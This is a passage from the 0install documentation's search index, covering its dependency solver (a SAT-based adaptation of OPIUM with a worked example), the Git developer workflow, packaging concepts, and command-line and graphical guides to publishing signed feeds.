system installation of 0install. It's better to create a local feed for your program and give 0install as a dependency. Then you can be sure your program will get a version of the libraries that it is compatible with (the system version may be too old). Here's a sample feed you can use:</p> <pre><code>&lt;?xml version=\"1.0\" ?&gt;\n&lt;interface xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"&gt;\n  &lt;name&gt;api-example&lt;/name&gt;\n  &lt;summary&gt;shows how to use the 0install Python API&lt;/summary&gt;\n\n  &lt;group&gt;\n    &lt;command name=\"run\" path=\"example.py\"&gt;\n      &lt;runner interface=\"https://apps.0install.net/python/python.xml\"&gt;\n    &lt;version before=\"3\"/&gt;\n      &lt;/runner&gt;\n    &lt;/command&gt;\n    &lt;requires interface=\"https://apps.0install.net/0install/0install-python.xml\"&gt;\n      &lt;version not-before=\"1.0\"/&gt;\n      &lt;environment insert=\"\" name=\"PYTHONPATH\"/&gt;\n    &lt;/requires&gt;\n    &lt;implementation id=\".\" version=\"0.1-pre\"/&gt;\n  &lt;/group&gt;\n&lt;/interface&gt;\n</code></pre>"},{"location":"developers/solver/","title":"The Solver","text":"<p>When you run a program with 0install, 0install must select a version of the program and a compatible version of each dependency it requires, recursively. Choosing the best set of versions from the billions of potential combinations is the job of the Solver module. The 0install solver is an adaptation of the OPIUM algorithm (Optimal Package Install/Uninstall Manager).</p>"},{"location":"developers/solver/#background","title":"Background","text":"<p>OPIUM was designed as a replacement solver for Debian's apt-get. With apt-get, if two programs depend on different versions of the same library, they can't both be installed at once. When you try to install one, apt-get will first uninstall the other. Sometimes this is unavoidable, but in other cases there is a choice of dependency. The choices apt-get makes determine which other packages must be uninstalled, but it doesn't always find the best solution (or even any solution at all). OPIUM solved this problem by ensuring that the best available choice was always made.</p> <p>0install has a slightly different problem. In 0install, every package is unpacked to its own directory. Libraries are shared when possible (two programs depend on the same version), and installed in parallel otherwise. Therefore, installing one program with 0install never requires uninstalling another. However, it is still possible for the dependencies within a single program to conflict with each other. For example, a Python program may depend on \"python2.5 or python2.6\", but a library it uses may only work with one of them. When running that particular program, 0install must choose a version of Python and a version of the library that are compatible.</p> <p>While apt-get has to look for conflicts across a very large number of packages (every package installed or being considered for installation), 0install only has to consider the packages needed for the program being run, but it must look at a large number of different possible versions for each package.</p> <p>Before 2010, 0install used a simple non-backtracking solver, which was possible because most packages had only a few dependencies. Because exactly the same set of versions was available to everyone, if a program was installable by its author then it would be installable everywhere, and even if some dependencies did conflict it was easy enough to list them in some order so that 0install always got a solution. But a couple of things made life more complicated...</p> Multi-arch support A typical modern 64-bit system is also capable of running 32-bit code. However a single program must be either entirely 64-bit or entirely 32-bit. We can't, for example, select a 64-bit version of libgtk and a 32-bit version of Python for a single application. In other words, every 64-bit binary conflicts with every 32-bit binary, which means we have to deal with a lot more conflicts these days. Native packages The Sugar developers wanted their 0install packages to depend on existing distribution packages in many cases. The normal way to do this is to provide a 0install download of the dependency (e.g Python 2.6) yourself, but tell 0install it can use a distribution package instead if available. However, the Sugar developers (quite reasonably) wanted to avoid packaging Python at all and depend only on the distribution package. Because Python isn't binary-compatible across versions, they publish separate builds of their software for each version of Python and relied on 0install to choose the one that will work with their users' distributions. <p>These kinds of problems can't be solved using older versions of 0install. The solver would choose the Python 2.6 version of the main program (for example) and then try to select a version of Python 2.6 to go with it. If the distribution only had Python 2.5, this would fail. Aleksey Lim from the Sugar project worked around this problem by adding backtracking to the solver. However, this becomes very slow when there are many possible combinations of versions to consider.</p>"},{"location":"developers/solver/#adapting-the-opium-algorithm","title":"Adapting the OPIUM algorithm","text":"<p>Initially, I tried following the OPIUM paper closely. There, they represent each possible version of each package as a variable which is 1 if the package is to be installed and 0 if not. They make a list of constraints (expressions that must be true). For example, if we want to select a version of Firefox (either 3.5 or 3.6, but not both at once) we would write:</p> <p>firefox3.5 + firefox3.6 = 1</p> <p>If Firefox 3.6 depends on GTK &gt;= 2.18 then we can express that dependency as:</p> <p>gtk2.18.0 + gtk2.18.1 + gtk2.18.2 - firefox3.6 &gt;= 0</p> <p>This expression can be satisfied by either not choosing Firefox 3.6 (firefox3.6 = 0) or by choosing a compatible version of GTK to go with it.</p> <p>After writing out all these expressions, we pass them all to a pseudo-boolean constraint solver (I tested with minisat+). We also give it a cost function to minimise (e.g. selecting older versions \"costs\" more, so it chooses newer versions where possible). The solver then tells us which variables should be 1, and these are the versions to use.</p> <p>This scheme worked, but it turned out to be quite slow. The problem was the cost function: most combinations have a similar cost, which makes it difficult for the solver to narrow the search down quickly. There could even be several solutions with the same cost, so you might get a different set of versions every time you ran it!</p> <p>The solution was to optimise one component at a time:</p> <ol> <li>Solve, optimising for the \"best\" version of Firefox that could be part of a valid selection.</li> <li>Then solve again, for the \"best\" version of GTK that can be part of a valid combination with the previously selected version of Firefox.</li> <li>... and so on recursively until we have selected a version of every component we need.</li> </ol> <p>In fact, we don't need to use a cost function at all. We can just ask whether there is any valid combination involving the best version of Firefox. If not, we ask again for the second best version, etc. The problem can then be simplified to plain old Boolean satisfiability and implemented efficiently. A DPLL-based algorithm with conflict-driven learning turned out to be very fast, even implemented in pure Python.</p>"},{"location":"developers/solver/#worked-example","title":"Worked example","text":"<p>Consider the following case (we're trying to run \"prog\", of which there are two versions available):</p> <ul> <li>prog-1 requires lib-1 or lib-2</li> <li>prog-2 requires lib-2</li> <li>lib-1 requires python-2</li> <li>lib-2 requires python-3</li> <li>python-3 isn't available</li> </ul> <p>We first encode these rules into a set of binary expressions to be satisfied:</p> Requirement Boolean expression prog-1 requires lib-1 or lib-2 lib-1 or lib-2 or !prog-1 prog-2 requires lib-2 lib-2 or !prog-2 lib-1 requires python-2 python-2 or !lib-1 lib-2 requires python-3 python-3 or !lib-2 python-3 isn't available !python-3 <p>In addition, there are some constraints we always have: we must select a version of the program, and we can't select two different versions of any interface:</p> Requirement Boolean expression must select some prog prog-1 or prog-2 only one prog at_most_one(prog-1, prog-2) only one lib at_most_one(lib-1, lib-2) only one python at_most_one(python-2, python-3) <p>Note</p> <p>We could express at_most_one(a, b) as \"!a or !b\", but that scales badly when there are lots of versions, so our SAT solver adds at_most_one as a primitive.</p> <p>Now the solve proceeds as follows:</p> <ol> <li>Find \"unit\" clauses. Here we find \"!python3\".</li> <li>Simplify all rules containing python3 to get:<ul> <li>lib-1 or lib-2 or !prog-1</li> <li>lib-2 or !prog-2</li> <li>python-2 or !lib-1</li> <li>!lib-2</li> <li>!python-3</li> <li>prog-1 or prog-2</li> <li>at_most_one(prog-1, prog-2)</li> <li>at_most_one(lib-1, lib-2)</li> </ul> </li> <li>We now have a new unit clause: \"!lib-2\". Simplify again:<ul> <li>lib-1 or !prog-1</li> <li>!prog-2</li> <li>python-2 or !lib-1</li> <li>!lib-2</li> <li>!python-3</li> <li>prog-1 or prog-2</li> <li>at_most_one(prog-1, prog-2)</li> </ul> </li> <li>Now we have \"!prog-2\":<ul> <li>lib-1 or !prog-1</li> <li>!prog-2</li> <li>python-2 or !lib-1</li> <li>!lib-2</li> <li>!python-3</li> <li>prog-1</li> </ul> </li> <li>Now we have \"prog-1\", which gets us \"lib-1\", which leaves us with the solution:<ul> <li>lib-1</li> <li>!prog-2</li> <li>python-2</li> <li>!lib-2</li> <li>!python-3</li> <li>prog-1</li> </ul> </li> <li>0install will then run prog-1 with lib-1 and python-2.</li> </ol> <p>In the above case, we were able to solve the problem simply by simplifying. Sometimes, we reach a point where there are no unit-clauses left. In that case, we set one undecided variable to try the most optimal remaining combination. If that leads to a solution, we have the optimal solution. If it leads to a conflict, we use \"conflict driven learning\" to learn a general rule which would avoid us trying that path, backtrack, and resume. The learning system helps to avoid exploring similar wrong-paths as the solve continues.</p> <p>The key to making this work is picking the most optimal next variable. Each time we need to choose, we do a depth first search of the current dependency tree: if we haven't yet picked a version of prog then we try setting the best remaining one to true (e.g. \"prog-2 = true\"). If we've already picked a version of prog, we look at its first dependency (always lib in this case) and try the best version of that, and so on.</p>"},{"location":"developers/solver/#the-ocaml-implementation","title":"The OCaml implementation","text":"<p>The blog post Simplifying the Solver With Functors contains more information about the new OCaml implementation of the solver.</p>"},{"location":"developers/using-git/","title":"Using Git","text":""},{"location":"developers/using-git/#testing-developer-versions-using-git","title":"Testing developer versions using Git","text":"<p>If you want to work on the code, or test a fix that has just been made, you'll want to get the latest developer version. We use Git for version control, so make sure you have that. You'll also need 'gettext-tools' to build the translations.</p> <p>To install these on Ubuntu, open a terminal emulator and run this command:</p> <pre><code>$ sudo apt-get install git gitk gettext\n</code></pre> <p>(gitk is a largish visualisation tool and is not strictly necessary, but highly recommended)</p> <p>Click on the SCM link on any program's page to see its Git page (for example, 0install.git for 0install itself). The link for cloning is displayed there; use it like this:</p> <pre><code>$ git clone https://github.com/0install/0install.git\n$ cd 0install\n</code></pre> <p>The directory contains the latest version, plus a single (hidden) .git directory with all the git-related bits.</p> <p>To see the log:</p> <pre><code>$ git log\n</code></pre> <p>This doesn't require network access; your clone has the whole history.</p> <p>To view a visualisation of the history:</p> <pre><code>$ gitk --all\n</code></pre> <p>(<code>--all</code> shows the history of all branches and tags, not just the main trunk)</p>"},{"location":"developers/using-git/#fetching-updates","title":"Fetching updates","text":"<p>To download the latest updates into your copy:</p> <pre><code>$ git pull --rebase\n</code></pre> <p>(The <code>--rebase</code> option says that if you've committed some changes locally, they should be reapplied on top of the latest version. Otherwise, it would create a merge commit, which is usually not what you want.)</p> <p>You can also pull from other places. If someone posts to the mailing list, they will tell you where to pull from to try the feature out. If they send a patch, you can apply it with:</p> <pre><code>$ git am the.patch\n</code></pre>"},{"location":"developers/using-git/#understanding-the-ocaml-code","title":"Understanding the OCaml code","text":"<p>Most modules have two files - a <code>.ml</code> file containing the implementation and a <code>.mli</code> file describing the module's public interface. You should always start by reading the <code>.mli</code> file. sigs.mli describes several abstract interfaces used in the code.</p> <p>Thomas Leonard's blog has many blog posts describing various aspects of 0install. For example, Simplifying the Solver With Functors explains how 0install chooses a compatible set of libraries to run a program, while Asynchronous Python vs OCaml describes the code for downloading things.</p>"},{"location":"developers/using-git/#making-patches","title":"Making patches","text":"<p>If you've changed the code in some way then you can commit the changes like this (this just stores them on your own computer, in the <code>.git</code> sub-directory).</p> <pre><code>$ git commit -a\n</code></pre> <p>Enter a log message. The first line should be a short summary (like the subject of an email). Then leave a blank line, then write a longer description.</p> <p>To view your patch after committing:</p> <pre><code>$ git show\n</code></pre> <p>If you realised you made a mistake, correct it and then do:</p> <pre><code>$ git commit -a --amend\n</code></pre> <p>Finally, to make a patch file ready to send to the mailing list:</p> <pre><code>$ git format-patch origin/master\n</code></pre>"},{"location":"developers/using-git/#making-a-new-translation","title":"Making a new translation","text":"<p>Attention</p> <p>Translations are not currently working - see Gettext support in OCaml.</p> <p>Note</p> <p>If you prefer, you can also use the Transifex web interface to work on translations.</p> <p>The steps are:</p> <ol> <li>Create the <code>.pot</code> (<code>.po</code> template) file.</li> <li>Create a new directory <code>share/locale/_$locale_/LC_MESSAGES</code> inside the Git checkout.</li> <li>Copy the <code>.pot</code> file inside it with a <code>.po</code> extension.</li> </ol> <p>e.g. to make a French translation:</p> <pre><code>$ make share/locale/zero-install.pot\n$ mkdir -p share/locale/fr/LC_MESSAGES\n$ cp share/locale/zero-install.pot share/locale/fr/LC_MESSAGES/zero-install.po\n</code></pre> <p>Then edit the <code>.po</code> file to give a translation for each string. When you're done, create the <code>.mo</code> file from the <code>.po</code> file and test:</p> <pre><code>$ make translations\n$ ./0install\n</code></pre> <p>Finally, send us the new <code>.po</code> file.</p>"},{"location":"packaging/","title":"Packaging overview","text":"<p>To make software available through 0install, you need to publish a signed \"feed\" XML file on your web page. This file lists the available versions and their dependencies and says how to run the program. There are lots of ways to create this XML file.</p> <p>To see an example of the XML, go to any 0install program's feed in your browser (e.g. 0export) and View Page Source.</p> <p>Before you start, have a look at Concepts to make sure you understand some key terms and ideas.</p> <p>I want to...</p> <ul> <li>Publish an XML file for an existing binary release</li> <li>Publish XML for a source release</li> <li>Create an XML file describing my own software</li> <li>Learn more</li> </ul>"},{"location":"packaging/#publish-an-xml-file-for-an-existing-binary-release","title":"Publish an XML file for an existing binary release","text":"<ul> <li>Read the binary packaging guide. This tutorial shows how to create an XML file describing the Blender 3D-animation application. The binary archive is published by the upstream authors and requires no modifications.</li> </ul>"},{"location":"packaging/#publish-xml-for-a-source-release","title":"Publish XML for a source release","text":"<ul> <li>Start by reading the binary packaging guide. Most of the steps are the same.</li> <li>Read the 0compile user guide to understand how users compile 0install software.</li> <li>Read the 0compile developer guide for a tutorial showing how to publish the GNU Hello example package.</li> </ul>"},{"location":"packaging/#create-an-xml-file-describing-my-own-software","title":"Create an XML file describing my own software","text":"<ul> <li>Read the 0release documentation, which shows how to add a local feed to your source repository. Users can use this to run your program from a Git checkout, and you can use it to generate new releases automatically.</li> <li>Have a look at the template projects for examples in various programming languages (Python, Java, .NET, C).</li> </ul>"},{"location":"packaging/#learn-more","title":"Learn more","text":"<p>Other useful documentation</p> Feed specification The specification of the XML format. Templates Sample code packages which you can use as templates when creating a new program that will be distributed using 0install, or as examples for your own programs. Tools An index of the tools provided by the 0install project for generating feeds. <p>Articles</p> Binary distribution with 0install Blog article describing how to make packages using the 0template command-line tool. Compiling with SCons and GTK Article showing how to use Zero Install in your build scripts to download the SCons build system and use it to compile your program. Easy GTK binary compatibility This blog article shows how to use Zero Install to compile your program against older versions of library headers than are the default on your system. Binaries created this way work on a wider range of systems (all systems with a GTK version newer than the headers). Also, since they download the required headers automatically, users don't need to have the headers already on their system in order to compile your program. The binaries produced this way do not depend on Zero Install, so you can use Zero Install as part of your build process even if you don't distribute the resulting binaries that way."},{"location":"packaging/concepts/","title":"Concepts","text":""},{"location":"packaging/concepts/#interfaces","title":"Interfaces","text":"<p>An interface describes what something does (e.g. \"Edit - a simple text editor\").</p> <p>In Zero Install, interfaces are named by globally unique URIs (like web pages). Some examples of interfaces are:</p> <ul> <li><code>http://rox.sourceforge.net/2005/interfaces/Edit</code></li> <li><code>http://rox.sourceforge.net/2005/interfaces/ROX-Lib</code></li> </ul> <p>When a user asks to run a program, they give the interface URI:</p> <pre><code>0install run http://rox.sourceforge.net/2005/interfaces/Edit\n</code></pre> <p>When a program depends on a library, it gives library's interface URI:</p> <pre><code>&lt;requires interface=\"http://rox.sourceforge.net/2005/interfaces/ROX-Lib\"&gt;\n</code></pre>"},{"location":"packaging/concepts/#feed-files","title":"Feed files","text":"<p>A feed file is a list of implementations (versions) of an interface. It is called a feed because new versions get added to it when they are released, just as news items are added to an RSS feed.</p> <p>Usually an interface has only one feed file, located at the interface's URI. Some examples of feeds are:</p> <ul> <li><code>http://rox.sourceforge.net/2005/interfaces/Edit</code></li> <li><code>http://rox.sourceforge.net/2005/interfaces/ROX-Lib</code></li> <li><code>/home/tal/dev/edit/Edit.xml</code> (a local feed)</li> </ul> <p>You can add additional local and remote feeds to an interface. A local feed is located locally on your machine, whereas a remote feed is located on the web (even if it is cached on your machine).</p>"},{"location":"packaging/concepts/#implementations","title":"Implementations","text":"<p>An implementation is something that implements an interface. <code>Edit-1.9.6</code> and <code>Edit-1.9.7</code> are both implementations of <code>http://rox.sourceforge.net/2005/interfaces/Edit</code>.</p> <p>Each implementation of an interface is identified by a cryptographic digest, eg:</p> <ul> <li><code>sha1=235cb9dd77ef78ef2a79abe98f1fcc404bba4889</code></li> <li><code>sha1=c86d09f1113041f5eaaa8c3d1416fcf4dad8e2e0</code></li> </ul> <p>For platform independent binaries (e.g. Python code) there will be one implementation for each version. For compiled code, there will be one implementation per architecture per version.</p>"},{"location":"packaging/concepts/#launching","title":"Launching","text":"<p>When you launch a program (like Edit) 0install looks up the feed files of the interface and chooses an implementation of the interface and the interfaces it depends on according to the policy settings (e.g. preferring \"stable\" or \"testing\" implementations). 0install then downloads the implementations if they are missing from the cache. Lastly, 0install uses environment variables (bindings) to tell the program where to find its dependencies; this process is known as Dependency Injection (or Inversion of Control).</p>"},{"location":"packaging/guide-cli/","title":"Packaging guide (command-line)","text":"<p>This guide shows how to make software available through Zero Install, using the command-line 0template program. New users may prefer to start with the graphical interface instead, but this version is useful when writing scripts to automatically publish new versions, or if you can't run the graphical version for some reason.</p> <p>We will start by packaging SCons, a build system (a little like Make).</p> <p>You should already be familiar with the general operation of 0install. In not, start by reading the Introduction tutorial.</p>"},{"location":"packaging/guide-cli/#introduction","title":"Introduction","text":"<p>SCons is particularly easy to package, because it is designed to be bundled with other applications and used in their build process, and can therefore be executed in place right after unpacking. Programs that can be run in this way are the easiest to make available through Zero Install. To do this we need to create a small XML file stating:</p> <ul> <li>Which versions are available.</li> <li>Where each one can be downloaded from.</li> <li>How each version can be run.</li> <li>Any dependencies each version has on other packages.</li> </ul> <p>You can write this feed file with a text editor just by reading the file format specification, but it's easier to use the <code>0template</code> command. <code>0template</code> will create an initial template for you, check that the file is valid, and makes many operations easier. The command is, of course, available through Zero Install. To save typing its full URI each time you run it, create an app now:</p> <pre><code>$ 0install add 0template https://apps.0install.net/0install/0template.xml\n$ 0template --help\nusage: 0template.py [-h] [-o OUTPUT] [--from-feed FROM_FEED]\n                    template [name=value [name=value ...]]\n[...]\n</code></pre> <p>See also:</p> <ul> <li>0template</li> <li>SCons homepage</li> </ul>"},{"location":"packaging/guide-cli/#creating-the-template","title":"Creating the template","text":"<p>Run <code>0template</code> now to create a new file called <code>SCons.xml.template</code>:</p> <pre><code>$ 0template SCons.xml.template\n'SCons.xml.template' does not exist; creating new template.\n\nDoes your program need to be compiled before it can be used?\n\n1) Generate a source template (e.g. for compiling C source code)\n2) Generate a binary template (e.g. for a pre-compiled binary or script)\n\n&gt; 2\n\nWriting SCons.xml.template\n</code></pre> <p><code>0template</code> will create a new template, which you can open in a text editor.</p> <p>Fill in the fields in the XML template. The comments should guide you, but these are the exact changes we will make now:</p> <ul> <li>Set the <code>summary</code> to a short description. Start with a lower-case letter (except for proper nouns) and don't include the name of the program. The summary is normally shown after a dash, e.g. SCons - a software construction tool.</li> <li>The <code>description</code> fields can be longer. Copying some text from the project's web page often works well.</li> <li>Set the <code>homepage</code> to the program's main web-site (or to your own site if you have a page for it). This is where users will go if they want more information than is in the description. Don't forget to uncomment it by removing the <code>&lt;!--</code> and <code>--&gt;</code> markers around it.</li> <li>Set the <code>icon</code> to the URL of a small PNG format icon if you want.</li> <li>Set the <code>feed-for</code> element to the URL where you plan to host the XML feed file.   Since other programs that depend on this one will use the URL to find it, try to pick a URL that won't change.</li> <li>Set the <code>license</code> attribute to the project's license.</li> <li>Set the <code>archive</code> link to the download URL, with <code>{version}</code> as a place-holder for the version.</li> <li>The main program (which we ran above) is called <code>scons.py</code>, so change the <code>path</code> attribute to that.</li> <li>You can add any dependencies here too. The generated example is for a Python 3 program, and we can just leave that as it is.</li> </ul> <p>Your final version should look something like this:</p> <pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;interface xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"&gt;\n  &lt;name&gt;SCons&lt;/name&gt;\n  &lt;summary&gt;a software construction tool&lt;/summary&gt;\n\n  &lt;description&gt;\nSCons is a software construction tool (build tool substitute for Make)\nimplemented in Python. It features a modular build engine that can be\nembedded in other software. SCons configuration files are Python scripts\nthat call the build engine API.\n\nIt can scan files to detect dependencies automatically and maintain a global\nview of all dependencies in a build tree, and uses MD5 signatures to detect\nchanged file contents reliably. Timestamps can be used if you prefer. SCons\nalso supports parallel builds and is easily extensible through user-defined\nbuilder and scanner objects.\n  &lt;/description&gt;\n\n  &lt;homepage&gt;http://www.scons.org/&lt;/homepage&gt;\n\n  &lt;feed-for interface=\"http://example.com/scons.xml\"/&gt;\n\n  &lt;group license=\"OSI Approved :: MIT/X Consortium License\"&gt;\n    &lt;command name=\"run\" path=\"scons.py\"&gt;\n      &lt;runner interface=\"https://apps.0install.net/python/python.xml\"&gt;\n        &lt;version not-before=\"3\"/&gt;\n      &lt;/runner&gt;\n    &lt;/command&gt;\n\n    &lt;implementation arch=\"*-*\" version=\"{version}\"&gt;\n      &lt;manifest-digest/&gt;\n      &lt;archive href=\"https://downloads.sourceforge.net/scons/scons-local-{version}.tar.gz\"/&gt;\n    &lt;/implementation&gt;\n  &lt;/group&gt;\n&lt;/interface&gt;\n</code></pre> <p>This is a template, from which we can create instances for particular versions.</p>"},{"location":"packaging/guide-cli/#creating-a-feed-for-a-new-version","title":"Creating a feed for a new version","text":"<p>We can apply the template to a specific version of SCons by supplying a value for the <code>version</code> placeholder, like this:</p> <pre><code>$ 0template SCons.xml.template version=3.1.1\nDownloading https://downloads.sourceforge.net/scons/scons-local-3.1.1.tar.gz to .../scons-local-3.1.1.tar.gz\nWriting SCons-3.1.1.xml\n</code></pre> <p>You can now execute the generated feed, like this:</p> <pre><code>$ 0install run SCons-3.1.1.xml --version\nSCons by Steven Knight et al.:\n...\n</code></pre> <p>If you look in the <code>SCons-3.1.1.xml</code> file, you'll see that <code>0template</code> filled in the <code>implementation</code> element:</p> <pre><code>&lt;implementation arch=\"*-*\" id=\"sha1new=fdcfde1da872a034e7f241dafa4fd2484e283df0\" released=\"2019-09-10\" version=\"3.1.1\"&gt;\n  &lt;manifest-digest sha256new=\"FLGRFSTMVPN5JP4EYBMBZBAQRCXTUSRLUD5QCULJ2YVQ3E4SYCBA\"/&gt;\n  &lt;archive href=\"https://downloads.sourceforge.net/scons/scons-local-3.1.1.tar.gz\" size=\"456592\"/&gt;\n&lt;/implementation&gt;\n</code></pre> <p>The <code>manifest-digest</code> gives the secure hash of the contents of the package. If the archive is changed (e.g., by someone breaking into SCons's web-server) then the hash won't match and 0install will refuse the download. Inside the <code>implementation</code> element is a list of ways of getting it. In this case, we state that a directory with the given hash can be created by downloading the named archive and extracting it.</p> <p>See also:</p> <ul> <li>Feed file format specification</li> <li>Archives</li> </ul>"},{"location":"packaging/guide-cli/#publishing-the-interface","title":"Publishing the interface","text":"<p>If you want to add the interface to an existing repository, you can just submit it to the repository owner. If you want to host it yourself, the easiest way is to use the 0repo tool.</p> <pre><code>$ 0install add 0repo http://0install.net/tools/0repo.xml\n</code></pre> <p>If you do not already have a GPG key-pair, create one now. You can accept the defaults for most fields; just enter your name and email address:</p> <pre><code>$ gpg --gen-key\n</code></pre> <p>Then create the repository (identifying the key you just created as the signing key):</p> <pre><code>$ 0repo create ~/repositories/myrepo 'John Smith'\n$ cd ~/repositories/myrepo\n</code></pre> <p>Edit <code>~/repositories/myrepo/0repo-config.py</code> and set <code>REPOSITORY_BASE_URL</code> to the URL of the repository (the interface URL you chose above needs to be below this). For example, we used <code>&lt;feed-for interface=\"http://example.com/scons.xml\"/&gt;</code> above, so we'd set:</p> <pre><code>REPOSITORY_BASE_URL = \"http://example.com/\"\n</code></pre> <p>There are lots of other things you can configure here to automate releases (consult 0repo's README for details), but for now you can just leave everything manual.</p> <p>Register the new repository so that <code>0repo</code> can find it:</p> <pre><code>$ 0repo register\nCreated new entry in ~/.config/0install.net/0repo/repositories.json:\nhttp://example.com/: {\"path\": \".../myrepo\", \"type\": \"local\"}\n</code></pre> <p>Now we can add the new version of SCons to the new repository:</p> <pre><code>$ 0repo add SCons-3.1.1.xml\n[...]\nNow copy .../myrepo/public to http://example.com/\nPress Return when done (edit 0repo-config.py:upload_public_dir() to automate this)\n</code></pre> <p>Copy the generated <code>public</code> directory to your server and you're done! If you want to test locally first, you can do <code>0repo proxy</code> to run a dummy web-server locally:</p> <pre><code>$ 0repo proxy\nTo use:\nenv http_proxy='http://localhost:8080/' 0install [...]\n</code></pre> <p>Then test in another window with:</p> <pre><code>$ export http_proxy='http://localhost:8080/'\n$ 0install run http://example.com/scons.xml --version\nSCons by Steven Knight et al.:\n...\n</code></pre> <p>Once published, you can announce your new feed on the mailing list, and get your key added to the key-server's list of known keys.</p>"},{"location":"packaging/guide-cli/#adding-more-versions","title":"Adding more versions","text":"<p>You can now add more versions of SCons to your feed with two commands:</p> <pre><code>$ 0template SCons.xml.template version=$VERSION\n$ 0repo add SCons-$VERSION.xml\n</code></pre>"},{"location":"packaging/guide-cli/#further-reading","title":"Further reading","text":"0template More information about templates. 0repo More information about managing a public repository. Example: Find Find is a Python program with a dependency on a Python library. This example shows how to depend on other components. Example: Inkscape Inkscape is distributed as a binary RPM (among other formats). This guide shows how to publish these RPMs so that they can be run using Zero Install (by users without root access or on Debian systems, for example). Example: ROX-Filer ROX-Filer is a C program, which requires different binaries for different platforms. These binaries are built and published in interface files maintained by different people. Using the injector's feed mechanism, users only need to use the main ROX-Filer interface and will automatically get a binary for their platform, from the maintainer of that binary. Compiling with SCons and GTK Now that we've made SCons available through Zero Install, we can use it in our build scripts. This example shows how to build a GTK application written in C using Zero Install to get the build tool and the header files automatically."},{"location":"packaging/guide-gui/","title":"Packaging guide (graphical)","text":"<p>This guide shows how to make software available through Zero Install. We will start by packaging Blender, an open source 3D modelling and animation program.</p> <p>You should already be familiar with the general operation of Zero Install. If not, start by reading the Introduction tutorial.</p> <p>We assume here that a binary release already exists (perhaps published by someone else) and you want to make it available through 0install. If you want to publish your own programs, you might also be interested in 0release, which generates a release from a Git repository.</p> <p>Tip</p> <p>To check whether someone has already packaged a program, use the <code>0install search</code> command to search all known existing feeds.</p>"},{"location":"packaging/guide-gui/#tutorial","title":"Tutorial","text":"<p>To make a program available via Zero Install you need to create an XML 'feed' file, describing which versions are available, where they can be downloaded, and what other software they require. In this tutorial, we'll use the graphical 0publish-gui application to create this file. If you don't want to use a graphical interface (for example, because you want to publish new versions using a script) then you should read the command-line tutorial instead.</p> <p>Start by getting 0publish-gui in the usual way:</p> <pre><code>0install add 0publish-gui https://apps.0install.net/0install/0publish-gui.xml\n</code></pre> <p>Note</p> <p>The following text currently on describes the steps on Linux. Documentation for Windows coming soon.</p> <p>Run the program, giving it the name of the feed file you want to create, which should be named after the program:</p> <pre><code>0publish-gui Blender.xml\n</code></pre> <p>A window appears prompting you to enter some details about the program. Here, I've copied the details from the project's freshmeat.net page. The Icon field is optional, but I've added one anyway:</p> <p></p> <p>The next step is to add one or move versions of Blender to the feed, which we can do from the Versions tab using the Add Archive button:</p> <p></p> <p>Enter the URL of the archive for the new version (copy the link from the Blender site). This URL tells other people where to get it, so it must be present. If you've already downloaded the archive then choose it in the Local copy section. Otherwise, click on Download to download it now:</p> <p></p> <p>The top-level items in the archive are displayed in the Extract area. The reason for this is that there are two common ways of laying out archives. Some people put the files in the archive directly, while others create an extra top-level directory. In blender's case, the archive contains a single top-level directory called <code>blender-2.42a-linux-glibc232-py24-i386-static</code>.</p> <p>The reason this matters is because we need each version to have a similar structure. We don't want a directory name that's going to be different each time, so we select to extract just the contents of this directory. 0publish-gui is pretty smart about guessing whether to extract everything or just a sub-directory, so just go with the default.</p> <p></p> <p>Now we are prompted to enter some extra information about this version. The most important field to set is Main, which is the executable program inside the archive that is run when someone tries to use your feed. The drop-down menu shows the available executables.</p> <p>The License and Released fields are just for information. Released is the date you added this version to the feed, so the default of today's date is correct. The OS and CPU fields prevent people from trying to use this version on incompatible machines. The Docs field can be used to say which directory contains the documentation, if any.</p> <p>I've left Stability set to (inherit), which means that the rating will be inherited from any containing group. Since we don't have a group, it will get the default value of Testing. You can also inherit the other fields (by leaving them blank), although OS and CPU are inherited together (you can't inherit one and not the other). Groups are useful when you have lots of versions, so you don't have to keep specifying the same information for each one.</p> <p>Finally, the shaded ID field displays a cryptographic digest of the archive's contents. When other people use this feed to get Blender 2.42, this is how they know that they've downloaded exactly the same files as you have (in case an attacker replaces the download with a modified version).</p> <p></p> <p>You'll now see your new version shown in the list of versions, along with the single archive, which says where to get it. The names in parenthesis show which attributes we set. We can try out the interface by clicking on the Save and Test button:</p> <p></p> <p>This runs <code>0install run</code> on our XML file, in the usual way. Note that version 2.42 is already cached; it was added when we clicked OK in the Add Archive box. Click on Execute and check that it runs.</p> <p></p> <p>It all works perfectly, so we'll publish this feed on the web for other people to use. To do this, we need to sign the feed so people can check that it's really from us. Go to the Publishing tab and choose your GPG key from the menu. If you don't have a key, click on the Add button to create one now.</p> <p>When generating a key, you'll be asked a few difficult-looking questions; if unsure, just accept the defaults offered. Enter your name and e-mail address when prompted, and choose a good passphrase to protect the key:</p> <p></p> <p>There's one final thing left to do: we need to decide where on the web we'll publish the XML file. Enter the URL that people will use to download your feed in the section titled This feed's URL. Try to pick a location that won't change, as people will keep coming back here for updates.</p> <p>Click on Save to save it again. This time, you'll be prompted to enter your key passphrase (the one you chose when creating the key above):</p> <p></p> <p>The final result of all this is three files: the signed XML feed file itself, listing our single version, your GPG public key, which lets people check the signature, and an XSLT stylesheet, in case anyone wants to view the feed in their browser.</p> <p></p> <p>Upload all three files to your web-server. I put mine in http://0install.net/2007/3rd-party/. Now anyone can run Blender with the command:</p> <pre><code>$ 0install run http://0install.net/2007/3rd-party/Blender.xml\n</code></pre>"},{"location":"packaging/guide-gui/#check-your-feed","title":"Check your feed!","text":"<p>It's surprising how easy it is to forget to set the right permissions, etc, so check your new feed! FeedLint is an easy first step:</p> <pre><code>0install add feedlint https://apps.0install.net/0install/feedlint.xml\nfeedlint http://0install.net/2007/3rd-party/Blender.xml\n</code></pre>"},{"location":"packaging/guide-gui/#groups-and-dependencies","title":"Groups and dependencies","text":"<p>If the software depends on something else (e.g. a library) then use the Add Requires button to specify this. For example, 0publish-gui depends on ROX-Lib, which I specified like this:</p> <p></p> <p>This ensures that <code>.../ROX-Lib2/python</code> is in <code>PYTHONPATH</code>. When 0publish-gui does <code>import rox</code>, the import thus uses the directory <code>.../ROX-Lib2/python/rox</code>.</p> <p>When you want to add more versions, you should use the Add Group button to create a group. Make sure both versions are inside the new group (use drag-and-drop to move them). Then you only need to set the license, main, OS and CPU settings in one place. You can also share dependencies using groups.</p>"},{"location":"packaging/guide-gui/#trouble-shooting","title":"Trouble-shooting","text":"I 